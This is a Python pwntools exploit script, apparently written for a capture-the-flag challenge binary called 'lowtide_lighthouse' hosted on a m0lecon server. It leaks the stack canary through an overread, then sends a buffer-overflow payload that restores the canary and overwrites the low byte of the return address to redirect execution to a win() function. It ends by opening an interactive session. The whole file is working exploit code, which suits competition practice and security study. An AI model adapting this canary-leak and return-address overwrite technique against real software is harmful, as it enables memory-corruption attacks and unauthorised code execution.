#!/usr/bin/env python3

from pwn import *

exe = ELF("./lowtide_lighthouse_patched")

context.binary = exe
#context.log_level="debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13576)

    return r


def main():
    """
    [buffer]    -->16 byte
    [padding]   --> 8 byte
    [RBP]       --> 8 byte
    [RIP]       --> 8 byte
    
    """
    OFFSET_TO_CANARY_LOG_ENTRY=16+8#buffer 
    r = conn()
    r.recv()
    r.send(b'A')
    print("PRINT",r.recvuntil('A'))
    leak_draft=r.recvline()
    print(leak_draft)
    leak=leak_draft[31-8:32-1]
    leak=u64(leak,"little")
    print("LEAK",hex(leak))
    """for i in range(0,len(leak_draft),8):
        print(hex(u64(leak_draft[i:i+8],"little")))
""" 
    canary=leak
    #MAIN= exe.symbols["main"]

    payload=flat(
        b'A'* OFFSET_TO_CANARY_LOG_ENTRY,
        p64(canary),
        b'B'*8,
        b"\x6e",       # --> sovrascrivo il LSB dell RIP di log_entry(), 
                       #     0x13XXX in modo che punti ad 0x136e che è l'indirizzo di win()
       
    )
    print(len(payload))
    #r.send(payload)
    r.send(payload)
    
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
